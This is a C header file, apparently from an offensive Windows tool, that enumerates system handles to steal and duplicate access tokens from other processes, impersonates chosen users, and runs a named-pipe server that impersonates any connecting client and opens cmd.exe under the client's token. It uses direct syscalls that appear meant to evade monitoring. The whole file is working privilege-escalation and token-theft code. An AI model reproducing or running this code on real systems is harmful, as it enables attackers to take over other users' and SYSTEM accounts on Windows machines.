#pragma once
#include <Windows.h>
#include <winternl.h>
#include <lm.h>
#include <heapapi.h>
#include <handleapi.h>
#include <OleDlg.h>
#include <securitybaseapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <sddl.h>

#include "syscalls.h"

#define BUFFER_SIZE 0x10

#define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW       ((NTSTATUS)0x80000005L)

typedef struct _PROCESS_ACCESS_TOKEN
{
    HANDLE Token;
    HANDLE Thread;
} PROCESS_ACCESS_TOKEN, *PPROCESS_ACCESS_TOKEN;

// -----------------------------------------------------------------------------------------------------------------
// CREDIT: Some of this file's code is from https://github.com/sensepost/impersonate
// ------------------------------------------------------------------------------------------------------------------

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT ProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
}  SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE {
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG Inis_token_validAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG is_token_validAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef UNICODE_STRING OBJECT_NAME_INFORMATION;
typedef UNICODE_STRING* POBJECT_NAME_INFORMATION;

// Wrapper for a Token

typedef struct _Token {
    HANDLE tokenHandle;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO tokenHandleInfo;
    wchar_t* tokenUsername;
    TOKEN_TYPE tokenType;
} Token;

// ------------------------------------------------------------------------------------------------------------------

void run_cmd(Token* tokenToUse, const wchar_t* cmdToRun)
{
    HANDLE pNewToken;
    if (!DuplicateTokenEx(tokenToUse->tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, tokenToUse->tokenType, &pNewToken))
    {
        DWORD LastError = GetLastError();
        wprintf(L"[!] ERROR: Could not duplicate token: %d\n", LastError);
        CloseHandle(tokenToUse->tokenHandle);
        return;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, cmdToRun, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
    }

    CloseHandle(tokenToUse->tokenHandle);
    CloseHandle(pNewToken);
}

BOOL run_pipe_server() 
{
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    char buffer[256] = { 0 };
    DWORD dwRead = 0;
    DWORD bytesToRead = 1;
    LPWSTR pipeName = L"\\\\.\\pipe\\TestPipe";

    if (!InitializeSecurityDescriptor(&sa, SECURITY_DESCRIPTOR_REVISION))
    {
        printf("[!] Error: %d\n", GetLastError());
        return FALSE;
    }

    if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
    {
        printf("[!] Error: %d\n", GetLastError());
        return FALSE;
    }

    HANDLE hPipe = CreateNamedPipeW(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 256 * sizeof(char), 256 * sizeof(char), NMPWAIT_USE_DEFAULT_WAIT, &sa);

    printf("[*] Named pipe %ws set up. Waiting for client to connect...\n", pipeName);

    if (ConnectNamedPipe(hPipe, NULL))
    {
        printf("[*] Got connection!\n");

        if (!PeekNamedPipe(hPipe, &buffer, (256-1) * sizeof(char), &dwRead, &bytesToRead, NULL))
        {
            printf("[!] Failed to read from pipe: %d\n", GetLastError());
            return FALSE;
        }

        if (!ImpersonateNamedPipeClient(hPipe)) 
        {
            printf("[!] Failed to impersonate the client: %d\n", GetLastError());
            return FALSE;
        }

        HANDLE hToken;
        if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hToken))
        {
            printf("[*] Got token... opening cmd.exe\n");

            HANDLE pNewToken;
            if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pNewToken))
            {
                printf("[!] ERROR: Could not duplicate token: %d\n", GetLastError());
                CloseHandle(hToken);
                return FALSE;
            }

            // Revert to self to re-gain SeImpersonate priv
            RevertToSelf();
            
            STARTUPINFO si2;
            PROCESS_INFORMATION pi2;
            if (!CreateProcessWithTokenW(pNewToken, 0, L"C:\\Windows\\system32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2))
            {
                printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
                return FALSE;
            }

            return TRUE;
        }

        printf("[*] Could not get token: %d\n", GetLastError());
        return FALSE;
    }
}

BOOL setup_pipe_and_impersonate()
{
    DWORD dwThreadId1 = 0;
    HANDLE hThread = CreateThread(NULL, 0, run_pipe_server, NULL, 0, &dwThreadId1);
    DWORD dwWait = WaitForSingleObject(hThread, 120 * 100);

    if (dwWait != WAIT_OBJECT_0)
    {
        printf("[!] Timeout \n");
        return FALSE;
    }

    return TRUE;
}

BOOL impersonate(Token* tokenToUse)
{
    HANDLE pNewToken;
    if (!DuplicateTokenEx(tokenToUse->tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, tokenToUse->tokenType, &pNewToken))
    {
        DWORD LastError = GetLastError();
        wprintf(L"[!] ERROR: Could not duplicate token: %d\n", LastError);
        CloseHandle(tokenToUse->tokenHandle);
        return FALSE; // impersonation state did not change
    }

    printf("[*] Impersonating %ws in current thread\n", tokenToUse->tokenUsername);
             
    if (!ImpersonateLoggedOnUser(pNewToken))
    {
        printf("[!] ERROR: Impersonation failed: %d\n", GetLastError());
    }

    CloseHandle(tokenToUse->tokenHandle);
    CloseHandle(pNewToken);
    return TRUE;
}

LPWSTR get_object_info(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass)
{
    LPWSTR data = NULL;
    DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)malloc(dwSize);

    NTSTATUS ntReturn = sNtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    if ((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)) 
    {
        pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
        ntReturn = sNtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    }
    if ((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL)) 
    {
        data = (LPWSTR)calloc(pObjectInfo->Length, sizeof(WCHAR));
        CopyMemory(data, pObjectInfo->Buffer, pObjectInfo->Length);
    }
    free(pObjectInfo);
    return data;
}

void get_token_information(Token* token) 
{
    // Token Type
    DWORD returned_tokinfo_length;
    if (!GetTokenInformation(token->tokenHandle, TokenStatistics, NULL, 0, &returned_tokinfo_length))
    {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(token->tokenHandle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length))
        {
            if (TokenStatisticsInformation->TokenType == TokenPrimary) 
            {
                token->tokenType = TokenPrimary;
            }
            else if (TokenStatisticsInformation->TokenType == TokenImpersonation) 
            {
                token->tokenType = TokenImpersonation;
            }
        }
        GlobalFree(TokenStatisticsInformation);
    }

    // User Info
    wchar_t username[256], domain[256];
    wchar_t full_name[256]; 

    DWORD user_length = sizeof(username);
    DWORD domain_length = sizeof(domain);
    DWORD token_info;
    SID_NAME_USE sid;

    token->tokenUsername = (wchar_t*)L"UNKNOWN / EMPTY";
    if (!GetTokenInformation(token->tokenHandle, TokenUser, NULL, 0, &token_info))
    {
        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info); 
        if (GetTokenInformation(token->tokenHandle, TokenUser, TokenStatisticsInformation, token_info, &token_info))
        {
            // Query username and domain to token user SID
            LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
            swprintf_s(full_name, 256, L"%ws/%ws", domain, username);
            token->tokenUsername = full_name;
        }
        GlobalFree(TokenStatisticsInformation);
    }
}

void list_available_tokens(Token* foundTokens)
{
    int nFoundTokens = 0;
    ULONG systemHandleInformationClass = 0x10; // https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/handle.htm
    ULONG systemHandleInformationSize = 1024 * 1024 * 10;
    ULONG returnLength = 0;
    SYSTEM_HANDLE_INFORMATION* handleTableInformation = (SYSTEM_HANDLE_INFORMATION*)HeapAlloc(GetProcessHeap(), 0, systemHandleInformationSize);

    // Get all handles available & iterate over handles
    sNtQuerySystemInformation(systemHandleInformationClass, handleTableInformation, systemHandleInformationSize, &returnLength);
    HANDLE processSnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    for (DWORD i = 0; i < handleTableInformation->NumberOfHandles; i++)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = handleTableInformation->Handles[i];

        HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
        if (process == INVALID_HANDLE_VALUE)
        {
            CloseHandle(process);
            continue;
        }

        HANDLE dupHandle;
        if (DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0)
        {
            CloseHandle(process);
            continue;
        }

        // Check if handle is a Token
        LPWSTR objType = get_object_info(dupHandle, ObjectTypeInformation);
        if (wcscmp(objType, L"Token")) 
        {
            CloseHandle(process);
            CloseHandle(dupHandle);
            free(objType);
            continue;
        }
        free(objType);

        Token currToken;
        currToken.tokenHandle = dupHandle;
        currToken.tokenHandleInfo = handleInfo;
        get_token_information(&currToken);

        BOOL tokenAlreadyEnumerated = FALSE;
        for (int j = 0; j < nFoundTokens; ++j)
        {
            Token t = foundTokens[j];
            if ((t.tokenType == currToken.tokenType)
                && (wcscmp(t.tokenUsername, currToken.tokenUsername) == 0)
                && t.tokenHandleInfo.ProcessId == currToken.tokenHandleInfo.ProcessId) 
            {
                // Token with same attributes exists
                tokenAlreadyEnumerated = TRUE;
            }
        }

        if (tokenAlreadyEnumerated)
        {
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        foundTokens[nFoundTokens] = currToken;
        nFoundTokens++;
        const wchar_t* wTokenType = currToken.tokenType == TokenImpersonation ? L"ImpersonationToken" : L"PrimaryToken";

        // resolve PID to name
        wchar_t* processName = (wchar_t*)L"Unknown";
        if (processSnapshotHandle)
        {
            PROCESSENTRY32 process;
            process.dwSize = sizeof(PROCESSENTRY32);
            Process32First(processSnapshotHandle, &process);
            do
            {
                if (process.th32ProcessID == (DWORD)currToken.tokenHandleInfo.ProcessId)
                {
                    processName = process.szExeFile;
                    break;
                }
            } while (Process32Next(processSnapshotHandle, &process));
        }

        printf("[*] %i: [%ws]::[%ws(%i)]::[%ws]\n", nFoundTokens - 1, wTokenType, processName, currToken.tokenHandleInfo.ProcessId, currToken.tokenUsername);
            
        CloseHandle(process);
    }

    CloseHandle(processSnapshotHandle);
    HeapFree(GetProcessHeap(), 0, handleTableInformation);
}